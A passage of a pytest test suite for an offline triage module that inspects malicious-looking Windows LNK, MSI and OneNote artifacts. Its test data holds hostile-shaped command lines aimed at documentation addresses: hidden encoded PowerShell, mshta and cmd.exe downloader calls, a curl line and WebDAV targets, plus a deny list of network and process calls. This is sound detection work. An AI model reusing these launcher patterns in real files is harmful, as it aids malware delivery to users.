"""windows_artifact_triage (P367): LNK shortcuts, MSI installers and OneNote files, offline.

The synthetic inputs are built in tests (c8) by tests/modules/test_p2_g12_3.py, a malformed one of each format
included. tests/fixtures/windows_artifact_triage/*.child.json are the reports the REAL LnkParse3 1.6.0 /
olefile 0.47 / pymsi 0.0.0rc1 produced on those exact bytes: tests that need the optional libraries' output
(MSI tables, LnkParse3's 260-character quirk) feed them to the module offline.

Offline module: the networked failure cases of the guide (401/403/429/5xx/error-in-200) map here to refused,
malformed, truncated, oversized and foreign inputs; every run asserts that no request was made.
"""

from __future__ import annotations

import base64
import copy
import hashlib
import json
import struct
import sys
import types

import pytest

from tests.fakes import FakeHttp, module_fixture, run_module
from tests.modules import test_p2_g12_3 as B
from v3lum.core.entities import Entity
from v3lum.core.entities import EntityType as T
from v3lum.core.models import Status
from v3lum.modules.file_analysis import windows_artifact_triage as W
from v3lum.modules.file_analysis.windows_artifact_triage import WindowsArtifactTriage

BUILTIN = {"windows_artifact_triage_use_extras": False}


def run(tmp_path, name, data, *, settings=None, **kw):
    path = tmp_path / name
    path.write_bytes(data)
    http = FakeHttp()
    res = run_module(WindowsArtifactTriage, Entity.make(T.FILE, str(path)), http, settings=settings or {}, **kw)
    assert http.calls == [] and res.requests == 0  # c1/c6: nothing is ever fetched, resolved or contacted
    return res


def captured(name):
    return module_fixture("windows_artifact_triage", f"{name}.child.json")


def run_captured(tmp_path, monkeypatch, case, filename, data):
    """Run the module as if the sandbox child had returned the captured real-library report."""
    rep = captured(case)
    monkeypatch.setattr(W, "child_entry", lambda fmt, _data, *, use_extras=True: copy.deepcopy(rep))
    return run(tmp_path, filename, data)


def titles(res):
    return {f.title: f for f in res.findings}


def pivots(res, relation=None):
    return {(p.entity.type.value, p.entity.value): p for p in res.pivots if relation is None or p.relation == relation}


# ------------------------------------------------------------------ contract, c1
def test_contract_metadata():
    cls = WindowsArtifactTriage
    assert (cls.disclosure, cls.hosts, cls.provider, cls.terms, cls.access_model) == ("none", (), "", "open", "offline")
    assert cls.trust_tier == "n/a" and cls.max_tlp.value_str == "red" and cls.default_enabled is True
    assert cls.accepts == {T.FILE} and cls.max_requests == 0 and cls.requires_packages == () and cls.requires_keys == ()
    assert {T.URL, T.DOMAIN, T.IPV4, T.KEYWORD, T.SHA256} <= cls.produces
    assert cls.category == "file_analysis" and cls.opsec.name == "PASSIVE" and not cls.shares_input


def test_routing_table_sends_lnk_msi_and_onenote_here():
    from v3lum.modules.file_analysis.file_type_sniff import route
    for kind in ("lnk", "ole-msi", "ole-msp", "ole-mst", "onenote", "onenote-toc"):
        assert "windows_artifact_triage" in route(kind)


def test_other_files_are_not_applicable(tmp_path):
    res = run(tmp_path, "relatorio.txt", B.NOT_ARTIFACT)
    assert res.status is Status.SKIPPED and res.reason_code == "not_applicable" and "not an LNK" in res.error
    assert run(tmp_path, "vazio.lnk", b"").status is Status.SKIPPED
    pe = run(tmp_path, "setup.msi", B.mz_stub())  # a PE named .msi belongs to pe_triage, not here
    assert pe.status is Status.SKIPPED and pe.reason_code == "not_applicable"


def test_file_that_vanished_before_the_run(tmp_path):
    path = tmp_path / "sumiu.lnk"
    path.write_bytes(B.build_lnk_ok())
    entity = Entity.make(T.FILE, str(path))
    path.unlink()
    http = FakeHttp()
    gone = run_module(WindowsArtifactTriage, entity, http)
    assert gone.status is Status.SKIPPED and gone.reason_code == "not_applicable" and http.calls == []


# ------------------------------------------------------------------ c3 LNK: facts, markers, P366 hand-off
def test_lnk_powershell_dropper(tmp_path):
    res = run(tmp_path, "Fatura NF-e.pdf.lnk", B.build_lnk_ok(), settings=BUILTIN)
    assert res.status is Status.OK
    t = titles(res)
    assert t["Suspicious LNK: launches a script interpreter or system binary"].severity.label == "high"
    assert set(t["Suspicious LNK: launches a script interpreter or system binary"].attack) == {"T1204.002", "T1059.001"}
    assert t["Suspicious LNK: encoded or obfuscated arguments"].severity.label == "medium"
    assert t["Suspicious LNK: runs minimised without activation"].attack == ["T1564.003"]
    assert "masquerading" in t["Suspicious LNK: icon borrowed from another program"].tags
    for f in res.findings:
        assert f.criterion and "malicious" not in f.title.lower()
    lnk = res.attributes["lnk_shortcut"]
    assert lnk["target"] == "%windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    assert lnk["arguments"].startswith("-NoP -NonI -w hidden -enc ") and lnk["working_dir"] == "C:\\Windows\\System32"
    assert lnk["icon_location"].endswith("msedge.exe") and lnk["show_command"] == "SW_SHOWMINNOACTIVE"
    assert lnk["target_times"]["creation"] == "2026-11-19T12:00:00Z" and lnk["drive_type"] == "DRIVE_FIXED"
    assert lnk["parser"] == "builtin MS-SHLLINK reader" and res.attributes["windows_artifact"]["detected_by"] == "magic"
    # P366 hand-off: the -enc payload is decoded statically and its URL becomes a hostile candidate
    assert res.attributes["lnk_decoded_command"] == B.PS_LNK_SCRIPT
    handoff = res.attributes["script_decoder_inputs"][0]
    assert handoff["origin"] == "lnk:command_line" and handoff["decoder"] == "stand-in" and handoff["iocs"] >= 1
    url = pivots(res, "extracted_from")[("url", "https://203.0.113.10/boleto/nfe.ps1")]
    assert url.confidence_label == "probable" and "never contacted" in url.note
    assert res.attributes["windows_artifact_summary"].startswith("LNK -> %windir%")


def test_lnk_clustering_attributes_are_never_expanded(tmp_path):
    """c7: machine id, droid MAC and volume serial are clustering attributes; the keyword pivots carry
    expand=False and are never sent to any lookup."""
    res = run(tmp_path, "a.lnk", B.build_lnk_ok())
    assert res.attributes["lnk_machine_id"] == "desktop-exmpl01"
    assert res.attributes["lnk_droid_mac"] == "00:00:5e:00:53:01" and res.attributes["lnk_volume_serial"] == "5E00-5301"
    cl = pivots(res, "lnk_metadata")
    assert set(cl) == {("keyword", "lnk_machine_id:desktop-exmpl01"), ("keyword", "lnk_droid_mac:00:00:5e:00:53:01"),
                       ("keyword", "lnk_volume_serial:5E00-5301")}
    assert all(p.expand is False and "never sent to any lookup" in p.note for p in cl.values())
    assert "lnk_birth_droid_mac" not in res.attributes  # same as the current droid


def test_lnk_vm_droid_mac_is_a_local_hint_only(tmp_path):
    res = run(tmp_path, "doc.lnk", B.build_lnk_webdav())
    assert res.attributes["lnk_droid_mac"] == "00:0c:29:00:53:02"
    assert res.attributes["lnk_shortcut"]["droid_mac_vm_vendor"] == "VMware"


def test_lnk_webdav_target_and_unc_icon_are_hostile_pivots_never_contacted(tmp_path):
    """c6: WebDAV target (\\\\host@SSL\\DavWWWRoot) and UNC icon: hostile pivots, no SMB/WebDAV/HTTP access."""
    res = run(tmp_path, "Documento NF-e.lnk", B.build_lnk_webdav())
    t = titles(res)
    tgt = t["Suspicious LNK: target on a remote share or URL (never contacted)"]
    icon = t["Suspicious LNK: icon loaded from a remote share (forced authentication)"]
    assert tgt.severity.label == "high" and "webdav" in tgt.description and tgt.attack == ["T1204.002"]
    assert icon.severity.label == "high" and icon.attack == ["T1187"]  # public address: not an internal file server
    target_pivots = pivots(res, "lnk_target")
    assert ("url", "https://203.0.113.7/nfe/documento.vbs") in target_pivots  # derived from the WebDAV UNC path
    assert target_pivots[("ipv4", "203.0.113.7")].expand is False  # documentation address: not investigated
    assert "hostile" in target_pivots[("ipv4", "203.0.113.7")].note
    assert ("ipv4", "198.51.100.9") in pivots(res, "lnk_icon")
    assert res.attributes["lnk_shortcut"]["network_share"] == "\\\\203.0.113.7@SSL\\DavWWWRoot"


def test_lnk_internal_file_share_is_medium(tmp_path):
    """A plain SMB target on a private address or NetBIOS name is common in companies: MEDIUM, still hostile-shaped."""
    data = B.lnk_bytes(flags=B.F_LINKINFO | B.F_UNICODE, linkinfo=B.lnk_linkinfo_network("\\\\fileserver\\docs", "plano.xlsx"))
    res = run(tmp_path, "plano.lnk", data)
    f = titles(res)["Suspicious LNK: target on a remote share or URL (never contacted)"]
    assert f.severity.label == "medium" and "Internal file-share host" in f.description
    assert res.pivots == [] or all(p.relation != "lnk_target" or p.entity.type is not T.DOMAIN for p in res.pivots)


def test_lnk_padding_appended_data_and_script_refs(tmp_path):
    res = run(tmp_path, "nota.lnk", B.build_lnk_padded_overlay())
    t = titles(res)
    pad = t["Suspicious LNK: arguments hidden behind whitespace padding"]
    assert pad.severity.label == "high" and "mshta https://203.0.113.11/nfe.hta" in pad.description
    assert t["Suspicious LNK: data appended after the terminal block"].attack == ["T1027.009"]
    appended = B.APPENDED_VBS
    sha = hashlib.sha256(appended).hexdigest()
    emb = pivots(res, "contains")[("sha256", sha)]
    assert "never written to disk or executed" in emb.note
    assert res.attributes["embedded_files"][0]["kind"] == "vbs" and res.attributes["embedded_files"][0]["md5"] == hashlib.md5(appended).hexdigest()
    assert ("url", "https://203.0.113.11/nfe.hta") in pivots(res, "lnk_reference")
    assert ("url", "https://203.0.113.12/a.vbs") in pivots(res, "extracted_from")  # from the appended VBS (P366 input)
    assert res.attributes["lnk_shortcut"]["hidden_arguments"].startswith("/c echo start /min mshta")


def test_lnk_long_description_is_read_with_the_full_count(tmp_path):
    """c3: a > 260-character description; the exact StringData walk gives the real arguments."""
    res = run(tmp_path, "longo.lnk", B.build_lnk_long_description())
    assert res.attributes["lnk_shortcut"]["arguments"] == B.LONG_DESC_ARGS
    assert titles(res)["Suspicious LNK: string field longer than 260 characters"].severity.label == "medium"
    assert ("url", "https://203.0.113.60/x") in pivots(res, "lnk_reference")


def test_lnkparse3_260_char_quirk_is_corrected(tmp_path, monkeypatch):
    """With the real LnkParse3 1.6.0 report the arguments came back shifted, silently; the module uses the
    exact StringData walk instead (string_data_source) and still finds the real URL."""
    rep = captured("lnk_long_description")
    assert rep["lnk"]["data"]["command_line_arguments"] != B.LONG_DESC_ARGS  # LnkParse3's misreading
    res = run_captured(tmp_path, monkeypatch, "lnk_long_description", "longo.lnk", B.build_lnk_long_description())
    lnk = res.attributes["lnk_shortcut"]
    assert lnk["arguments"] == B.LONG_DESC_ARGS and lnk["string_data_source"] == "exact StringData walk"
    assert lnk["parser"] == "LnkParse3 1.6.0"
    assert ("url", "https://203.0.113.60/x") in pivots(res, "lnk_reference")
    assert "Artefact structure anomaly" not in titles(res)  # the quirk has its own finding


@pytest.mark.parametrize("case", ["lnk_ok", "lnk_webdav", "lnk_padded_overlay"])
def test_lnkparse3_reports_and_builtin_reader_give_the_same_result(case):
    """c3: LnkParse3 (captured) and the built-in reader normalise to the same facts, markers and pivots."""
    lib = W.analyse(captured(case))
    data = getattr(B, f"build_{case}")()
    own = W.analyse(W.lnk_report(data, use_extras=False))
    for k in ("target", "arguments", "working_dir", "icon_location", "show_command", "target_times", "network_share"):
        assert lib["facts"][k] == own["facts"][k], k
    assert lib["clustering"] == own["clustering"] and sorted(lib["markers"]) == sorted(own["markers"])
    assert [r["raw"] for r in lib["remote_targets"]] == [r["raw"] for r in own["remote_targets"]]
    assert [e["sha256"] for e in lib["embedded"]] == [e["sha256"] for e in own["embedded"]]


@pytest.mark.parametrize("builder,reason", [(B.build_lnk_malformed, "truncated ShellLinkHeader (60 of 76 bytes)"),
                                            (B.build_lnk_bad_clsid, "HeaderSize 0x4b != 0x4c")])
def test_malformed_lnk_is_error_never_empty(tmp_path, builder, reason):
    """c5: a parser failure is ERROR; a .lnk whose magic is broken stays in scope by its extension."""
    res = run(tmp_path, "quebrado.lnk", builder())
    assert res.status is Status.ERROR and res.reason_code == "error" and reason in res.error
    assert res.findings == [] and res.pivots == []
    assert res.attributes["windows_artifact_summary"].startswith("lnk: error")


def test_bad_clsid_lnk_without_lnk_extension_is_not_applicable(tmp_path):
    res = run(tmp_path, "dados.bin", B.build_lnk_bad_clsid())
    assert res.status is Status.SKIPPED and res.reason_code == "not_applicable"


def test_lnk_without_target_is_empty(tmp_path):
    res = run(tmp_path, "vazio.lnk", B.lnk_bytes(flags=B.F_UNICODE))
    assert res.status is Status.EMPTY and res.findings == []


def test_lnk_truncated_extra_data_is_a_parser_anomaly(tmp_path):
    data = B.build_lnk_ok()[:-40]  # cut inside the tracker block: no TerminalBlock
    res = run(tmp_path, "cortado.lnk", data, settings=BUILTIN)
    assert res.status is Status.OK
    anomaly = titles(res)["Artefact structure anomaly"]
    assert anomaly.severity.label == "low" and "ExtraData" in anomaly.description
    default = run(tmp_path, "cortado2.lnk", data)  # LnkParse3, when installed, words its own warning
    assert default.status is Status.OK and "Artefact structure anomaly" in titles(default)


# ------------------------------------------------------------------ c4/c5 OneNote
def test_onenote_embedded_hta_and_png(tmp_path):
    res = run(tmp_path, "Fatura.one", B.build_onenote_ok())
    assert res.status is Status.OK
    t = titles(res)
    active = t["Suspicious OneNote: embedded script or executable"]
    assert active.severity.label == "high" and "Fatura_2026-11.hta" in active.description and active.attack == ["T1204.002"]
    assert t["OneNote embeds a file"].severity.label == "info"
    shas = {hashlib.sha256(B.png_1x1()).hexdigest(), hashlib.sha256(B.HTA_LURE).hexdigest()}
    assert {v for (k, v) in pivots(res, "contains")} == shas
    assert ("url", "https://203.0.113.13/nfe/stage2.txt") in pivots(res, "extracted_from")  # HTA text to P366/P172
    assert res.attributes["onenote_file"]["embedded_count"] == 2 and res.attributes["onenote_file"]["kinds"] == ["hta", "png"]
    names = {e.get("name") for e in res.attributes["embedded_files"]}
    assert names == {"imagem.png", "Fatura_2026-11.hta"}


def test_onenote_without_embedded_files_is_empty(tmp_path):
    res = run(tmp_path, "Nota.one", B.build_onenote_empty())
    assert res.status is Status.EMPTY and res.findings == [] and res.pivots == []
    assert res.attributes["windows_artifact"]["reason"] == "no embedded files (no FileDataStoreObject found)"


def test_onenote_malformed_is_error(tmp_path):
    res = run(tmp_path, "quebrado.one", B.build_onenote_malformed())
    assert res.status is Status.ERROR and "declares 2147483647 bytes" in res.error


def test_onenote_truncated_header_with_extension_is_error(tmp_path):
    res = run(tmp_path, "curto.one", B.ONE_GUID + b"\x00" * 100)
    assert res.status is Status.ERROR and "truncated OneNote header" in res.error


def test_onenote_object_cap_sets_partial(monkeypatch):
    monkeypatch.setitem(W.LIMITS, "onenote_max_objects", 1)
    rep = W.scan_onenote(B.build_onenote_ok())
    assert rep["objects_capped"] and len(rep["objects"]) == 1
    assert W.analyse(rep)["partial"] is True


def test_onenote_footer_missing_and_reserved_nonzero():
    blob = bytearray(B.build_onenote_ok())
    off = blob.find(W.FDSO_HEADER, 1024)
    blob[off + 24] = 1  # reserved bytes must be zero
    foot = blob.find(W.FDSO_FOOTER, off)
    blob[foot:foot + 16] = b"\x00" * 16
    rep = W.scan_onenote(bytes(blob))
    assert {"reserved_nonzero", "footer_missing"} <= set(rep["markers"])
    titles_ = [f["title"] for f in W.artefact_findings(W.analyse(rep))]
    assert titles_.count("Artefact structure anomaly") == 2


# ------------------------------------------------------------------ c4 MSI
def test_msi_without_pymsi_reports_tables_not_parsed_never_empty(tmp_path):
    """c4: no pymsi -> OK with 'MSI tables not parsed', streams still hashed and script streams decoded."""
    res = run(tmp_path, "LeitorNFe.msi", B.build_msi_ok(), settings=BUILTIN)
    assert res.status is Status.OK
    assert res.attributes["msi_tables_status"].startswith("MSI tables not parsed (optional parsers disabled")
    info = titles(res)["MSI tables not parsed"]
    assert info.severity.label == "info" and "streams were hashed" in info.description
    assert {v for (k, v) in pivots(res, "contains")} == {hashlib.sha256(B.JS_BINARY).hexdigest(),
                                                       hashlib.sha256(B.mz_stub(b"CADll")).hexdigest()}
    pkg = res.attributes["msi_package"]
    assert pkg["summary"]["subject"] == "Leitor NF-e" and pkg["summary"]["platform"] == "Intel"
    assert pkg["summary"]["creating_application"].startswith("Windows Installer XML") and pkg["parser"] == "builtin MS-CFB reader"
    assert res.attributes["script_decoder_inputs"][0]["origin"] == "msi:stream:Binary.JsPayload"


def test_msi_tables_parsed_with_pymsi_report(tmp_path, monkeypatch):
    """The real pymsi report: CustomActions decoded, scripts and command lines to P366, references hostile."""
    res = run_captured(tmp_path, monkeypatch, "msi_ok", "LeitorNFe.msi", B.build_msi_ok())
    assert res.status is Status.OK and res.attributes["msi_tables_status"] == "parsed"
    t = titles(res)
    script = t["Suspicious MSI: script custom action"]
    assert script.severity.label == "high" and set(script.attack) == {"T1218.007", "T1059.005", "T1059.007"}
    assert "RunVbs" in script.description and "RunJsBin" in script.description
    assert t["Suspicious MSI: custom action runs a script interpreter or system binary"].severity.label == "high"
    assert t["MSI custom action runs a DLL or EXE"].severity.label == "low"
    assert t["MSI custom action runs as LocalSystem (deferred, no impersonation)"].severity.label == "medium"
    assert "MSI tables not parsed" not in t
    cas = {ca["name"]: ca for ca in res.attributes["msi_custom_actions"]}
    assert cas["RunCmdProp"]["command_line"] == "[SystemFolder]cmd.exe /c echo https://203.0.113.24/x.bat"
    assert cas["RunDllBin"]["elevated"] is True and cas["RunPs"]["lolbin"] is True
    refs = pivots(res, "msi_reference")
    assert "hostile" in refs[("url", "https://203.0.113.21/nfe/pkg.txt")].note
    assert "vendor metadata" in refs[("url", "https://www.example.com/suporte")].note  # ARPHELPLINK
    extracted = pivots(res, "extracted_from")
    assert ("url", "https://203.0.113.23/nfe.ps1") in extracted  # decoded from the RunPs -enc command line
    assert ("url", "http://198.51.100.20/stage2.txt") in extracted  # inline VBScript CustomAction
    assert res.attributes["msi_package"]["product"]["ProductName"] == "Leitor NF-e"
    assert res.attributes["windows_artifact_summary"].startswith("MSI 'Leitor NF-e' 1.0.0 by Example Org Ltda: 6 custom action(s)")


def test_msi_pymsi_failure_is_tables_not_parsed(tmp_path, monkeypatch):
    res = run_captured(tmp_path, monkeypatch, "msi_bad_tables", "LeitorNFe.msi", B.build_msi_bad_tables())
    assert res.status is Status.OK
    assert res.attributes["msi_tables_status"] == ("MSI tables not parsed (pymsi error: ValueError: Data length is not a "
                                                   "multiple of row size)")


def test_msi_without_pymsi_capture(tmp_path, monkeypatch):
    res = run_captured(tmp_path, monkeypatch, "msi_ok_nopymsi", "LeitorNFe.msi", B.build_msi_ok())
    assert res.attributes["msi_tables_status"] == "MSI tables not parsed (optional pymsi not installed)"


def test_benign_msi_has_no_alerts(tmp_path, monkeypatch):
    res = run_captured(tmp_path, monkeypatch, "msi_benign", "planilha.msi", B.build_msi_benign())
    assert res.status is Status.OK and all(f.severity.label == "info" for f in res.findings)
    assert res.attributes["msi_package"]["product"] == {"ProductName": "Planilha Exemplo", "Manufacturer": "Example Org Ltda",
                                                        "ProductVersion": "2.4.1", "ProductCode": "{0E9A3C55-5301-4E6F-8A9B-0C1D2E3F4B01}",
                                                        "ProductLanguage": "1046"}


def test_msi_malformed_is_error_by_extension(tmp_path):
    """c5: a compound file cut after 3 sectors is sniffed as generic OLE; named .msi it ends ERROR."""
    res = run(tmp_path, "cortado.msi", B.build_msi_malformed())
    assert res.status is Status.ERROR and res.reason_code == "error" and "malformed MSI" in res.error
    assert res.attributes["windows_artifact_summary"].startswith("msi: error")


@pytest.mark.parametrize("case,status,reason", [
    ("lnk_malformed", "error", "truncated ShellLinkHeader"), ("lnk_bad_clsid", "error", "HeaderSize 0x4b"),
    ("msi_malformed", "error", "OleFileError: incomplete OLE sector"), ("onenote_malformed", "error", "declares 2147483647 bytes"),
    ("onenote_empty", "empty", "no embedded files"), ("onenote_ok", "ok", None), ("msi_ok_nopymsi", "ok", "MSI tables not parsed"),
])
def test_captured_library_reports_map_to_statuses(case, status, reason):
    """c4/c5 on the real-library outputs: failures are 'error', never 'empty'; tables not parsed stays 'ok'."""
    result = W.analyse(captured(case))
    assert result["status"] == status
    assert (result["reason"] is None) if reason is None else reason in result["reason"]


# ------------------------------------------------------------------ c2 sandbox entry points, limits
def test_child_entry_output_fits_the_sandbox_cap():
    big = b"<html><head><title>x</title><HTA:APPLICATION/>" + b"<script>var a=1;</script>" + b"A" * (3 * 1024 * 1024)
    rep = W.child_entry("onenote", B.onenote_bytes([big, big, big]))
    assert len(json.dumps(rep)) <= W.LIMITS["report_max_bytes"]
    assert all(len(o.get("text") or "") <= W.LIMITS["text_max"] for o in rep["objects"])


def test_fit_report_trims_text_then_lists():
    rep = {"kind": "onenote", "objects": [{"text": "x" * 500_000} for _ in range(4)], "warnings": ["w"] * 10}
    out = W.fit_report(rep, max_bytes=200_000)
    assert len(json.dumps(out)) <= 200_000 and "text" in out["trimmed"]


def test_input_cap_is_reported(tmp_path, monkeypatch):
    monkeypatch.setitem(W.LIMITS, "input_max", 1500)
    res = run(tmp_path, "grande.lnk", B.build_lnk_ok())
    assert res.attributes["windows_artifact"]["partial"] is True
    assert "Artefact larger than the 100 MB input cap: only the first 100 MB were parsed" in titles(res)


def test_unknown_format_report_is_not_applicable():
    assert W.analyse({"kind": "unknown", "size": 3})["status"] == "not_applicable"
    assert W.analyse("garbage")["status"] == "not_applicable"
    assert W.analyse_lnk_report("garbage")["status"] == "error"
    assert W.analyse_msi_report(None)["status"] == "error"
    assert W.analyse_onenote_report([])["status"] == "error"


def test_parsers_have_no_network_process_or_file_writes():
    """c1/c2/c5: the module file is clean under the P327 lint and never opens files for writing."""
    from v3lum.core import lint
    issues = lint.lint_module_source(W.__file__)
    assert lint.blocking(issues) == []
    with open(W.__file__, encoding="utf-8") as fh:
        source = fh.read()
    for bad in ("open(", "subprocess", "os.system", "socket.", "eval(", "exec(", "urlopen", "requests."):
        assert bad not in source.replace("ole.openstream(", "").replace("re.compile(", ""), bad


# ------------------------------------------------------------------ P366 hand-off (c3, c5)
def test_standin_decoder_handles_encodedcommand_variants():
    script = "Write-Output 'x'; $u = 'https://203.0.113.40/a.ps1'"
    enc = B.ps_enc(script)
    for flag in ("-e", "-ec", "-enc", "-EncodedCommand", "/enc", "\u2013enc"):
        out = W.standin_decode(f"powershell.exe -NoP {flag} {enc}")
        assert [x["text"] for x in out["layers"]] == [script], flag
    nested = B.ps_enc(f"powershell -enc {enc}")
    out = W.standin_decode(f"powershell -enc {nested}")
    assert [x["n"] for x in out["layers"]] == [1, 2] and out["layers"][-1]["text"] == script
    fb = base64.b64encode(b"https://203.0.113.41/b.txt").decode()
    out = W.standin_decode(f"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{fb}'))")
    assert out["layers"][0]["text"] == "https://203.0.113.41/b.txt"
    assert W.standin_decode("cmd /c echo -enc not!base64")["layers"] == []
    assert W.standin_decode("-enc " + base64.b64encode(b"\x00\xff" * 40).decode())["layers"] == []  # binary


def test_script_decoder_module_is_used_when_installed(tmp_path, monkeypatch):
    calls = []

    def decode_layers(text, *, redact=None):
        calls.append(text)
        return {"layers": [{"n": 1, "technique": "ps_encodedcommand", "label": "layer 1: base64 UTF-16LE -EncodedCommand",
                            "text": "$u = 'https://203.0.113.50/p366.ps1'"}], "path": "L1:ps_encodedcommand", "stop": "no_more_encodings"}
    fake = types.ModuleType(W.SCRIPT_DECODER_MODULE)
    fake.decode_layers = decode_layers
    monkeypatch.setitem(sys.modules, W.SCRIPT_DECODER_MODULE, fake)
    res = run(tmp_path, "a.lnk", B.build_lnk_ok())
    assert calls and calls[0].endswith(B.PS_LNK_ARGS)
    handoff = res.attributes["script_decoder_inputs"][0]
    assert handoff["decoder"] == "script_decoder" and handoff["layers"] == ["layer 1: base64 UTF-16LE -EncodedCommand"]
    assert ("url", "https://203.0.113.50/p366.ps1") in pivots(res, "extracted_from")


def test_script_decoder_failure_falls_back_to_the_standin(tmp_path, monkeypatch):
    def decode_layers(text, *, redact=None):
        raise RuntimeError("budget")
    fake = types.ModuleType(W.SCRIPT_DECODER_MODULE)
    fake.decode_layers = decode_layers
    monkeypatch.setitem(sys.modules, W.SCRIPT_DECODER_MODULE, fake)
    res = run(tmp_path, "a.lnk", B.build_lnk_ok())
    handoff = res.attributes["script_decoder_inputs"][0]
    assert handoff["decoder"] == "stand-in" and handoff["decoder_error"] == "RuntimeError: budget"
    assert ("url", "https://203.0.113.10/boleto/nfe.ps1") in pivots(res, "extracted_from")


def test_namespace_urls_in_scripts_are_not_pivoted(tmp_path):
    hta = (b"<html><head><HTA:APPLICATION/><script language=\"VBScript\">\r\n"
           b"Dim n : n = \"http://schemas.microsoft.com/office/2006/relationships\"\r\n</script></head></html>\r\n")
    res = run(tmp_path, "n.one", B.onenote_bytes([hta]))
    assert not any("schemas.microsoft.com" in p.entity.value for p in res.pivots)


# ------------------------------------------------------------------ c6 target classification (as P269)
@pytest.mark.parametrize("raw,kind,host,ip,port,ssl", [
    ("\\\\203.0.113.7@SSL\\DavWWWRoot\\x\\a.vbs", "webdav", "203.0.113.7", "203.0.113.7", 443, True),
    ("\\\\files.example.com@8080\\share\\a.exe", "webdav", "files.example.com", None, 8080, None),
    ("\\\\198.51.100.9\\icons\\pdf.ico", "unc", "198.51.100.9", "198.51.100.9", None, None),
    ("\\\\?\\UNC\\srv.example.com\\c$\\x.bat", "unc", "srv.example.com", None, None, None),
    ("file://srv.example.com/share/a.js", "unc", "srv.example.com", None, None, None),
    ("file:///C:/Windows/notepad.exe", "local_path", None, None, None, None),
    ("https://cdn.example.com/x.hta", "url", "cdn.example.com", None, None, True),
    ("http://[2001:db8::5]:8080/a", "url", "2001:db8::5", "2001:db8::5", 8080, False),
    ("\\\\2001-db8--7.ipv6-literal.net\\s\\a", "unc", "2001-db8--7.ipv6-literal.net", "2001:db8::7", None, None),
    ("search-ms:query=x&crumb=location:\\\\203.0.113.8\\s", "protocol_handler", "203.0.113.8", "203.0.113.8", None, None),
    ("C:\\Windows\\System32\\cmd.exe", "local_path", None, None, None, None),
    ("%windir%\\system32\\mshta.exe", "env_path", None, None, None, None),
    ("..\\a.txt", "relative", None, None, None, None),
    ("", "empty", None, None, None, None),
])
def test_classify_target_never_resolves(raw, kind, host, ip, port, ssl):
    ref = W.classify_target(raw)
    assert (ref["kind"], ref["host"], ref["ip"], ref["port"], ref["ssl"]) == (kind, host, ip, port, ssl)


def test_webdav_url_derivation():
    assert W.webdav_url(W.classify_target("\\\\203.0.113.7@SSL\\DavWWWRoot\\nfe\\doc.vbs")) == "https://203.0.113.7/nfe/doc.vbs"
    assert W.webdav_url(W.classify_target("\\\\host.example.com@8080\\pasta\\a.js")) == "http://host.example.com:8080/pasta/a.js"
    assert W.webdav_url(W.classify_target("\\\\198.51.100.9\\icons\\a.ico")) is None  # plain SMB
    assert W.internal_share(W.classify_target("\\\\10.0.0.5\\docs")) and W.internal_share(W.classify_target("\\\\fileserver\\docs"))
    assert not W.internal_share(W.classify_target("\\\\203.0.113.7\\docs"))


def test_extract_net_refs_and_linear_regexes():
    refs = W.extract_net_refs("start \\\\203.0.113.9@SSL\\DavWWWRoot\\a.js & curl http://198.51.100.3/x & ping 192.0.2.4")
    assert [r["kind"] for r in refs] == ["webdav", "url", "bare_ip"]
    import time
    t0 = time.monotonic()
    for text in ("\\\\" * 50_000, "http://" + "a" * 200_000, "1." * 100_000, " " * 200_000 + "x"):
        W.extract_net_refs(text)
        W.argument_markers(text)
        W.sniff_blob(text.encode())
    assert time.monotonic() - t0 < 5


# ------------------------------------------------------------------ c7 helpers
def test_droid_info_and_clustering_helpers():
    import datetime as dt
    import uuid
    v1 = B.uuid_v1(dt.datetime(2026, 11, 20, 10, 0, tzinfo=dt.timezone.utc), B.DOC_MAC)
    info = W.droid_info(str(v1).upper())
    assert info["mac"] == "00:00:5e:00:53:01" and info["time"] == "2026-11-20T10:00:00Z" and info["version"] == 1
    rnd = uuid.UUID(fields=(1, 2, 0x1003, 0x80, 0x01, 0x010000005301))  # multicast bit: random node, not a MAC
    assert W.droid_info(str(rnd))["mac"] is None and W.droid_info(str(rnd))["mac_random"] is True
    assert W.droid_info(str(uuid.uuid4()))["mac"] is None and W.droid_info("zz") is None
    assert W.droid_info("00000000-0000-0000-0000-000000000000")["version"] is None
    assert W.volume_serial("0x5e005301") == "5E00-5301" and W.volume_serial(0) is None and W.volume_serial("ABCD-1234") == "ABCD-1234"
    assert W.volume_serial("lixo") is None and W.volume_serial(True) is None
    assert W.machine_id("DESKTOP-EXMPL01\x00") == "desktop-exmpl01" and W.machine_id("<script>") is None
    assert W.mac_vm_vendor("00:50:56:aa:bb:cc") == "VMware" and W.mac_vm_vendor("00:00:5e:00:53:01") is None


def beef0004(name, version=9):
    """A BEEF0004 extension block (version 9 layout: the long name starts at offset 46)."""
    head = struct.pack("<HHIIIH", 0, version, 0xBEEF0004, 0, 0, 0x2E) + b"\x00" * 18 + b"\x00\x00" + b"\x00" * 8
    raw = head + name.encode("utf-16-le") + b"\x00\x00" + struct.pack("<H", 0x14)
    return struct.pack("<H", len(raw)) + raw[2:]


def test_builtin_reader_prefers_the_long_name_of_beef0004_blocks():
    """Real Windows ID lists carry 8.3 primary names and the long name in a BEEF0004 extension block."""
    long_name = "Fatura NF-e 2026.pdf.exe"
    body = bytes([0x32, 0]) + struct.pack("<IHHH", 4096, 0, 0, 0x20) + b"FATURA~1.EXE\x00\x00" + beef0004(long_name)
    item = W._shell_item(body)
    assert item["primary_name"] == long_name and item["short_name"] == "FATURA~1.EXE" and item["file_size"] == 4096
    assert W._shell_item(bytes([0x32, 0]) + struct.pack("<IHHH", 1, 0, 0, 0x20) + b"A.TXT\x00")["primary_name"] == "A.TXT"
    assert W._shell_item(b"\x2f" + b"\x01\x02\xfe" * 7)["volume_name"] is None  # garbage is not a drive


def test_short_names_do_not_count_as_a_target_mismatch():
    rep = W.lnk_report(B.build_lnk_ok(), use_extras=False)
    for it in rep["lnk"]["target"]["items"]:
        if it.get("primary_name") == "powershell.exe":
            it["primary_name"] = "POWERS~1.EXE"
    assert "target_mismatch" not in W.analyse(rep)["markers"]
    it["primary_name"] = "notepad.exe"
    assert "target_mismatch" in W.analyse(rep)["markers"]


# ------------------------------------------------------------------ MSI helpers
@pytest.mark.parametrize("name,table", [("_StringPool", True), ("Property", True), ("Binary.JsPayload", False),
                                        ("Icon.app.exe", False), ("x", False)])
def test_msi_stream_name_roundtrip(name, table):
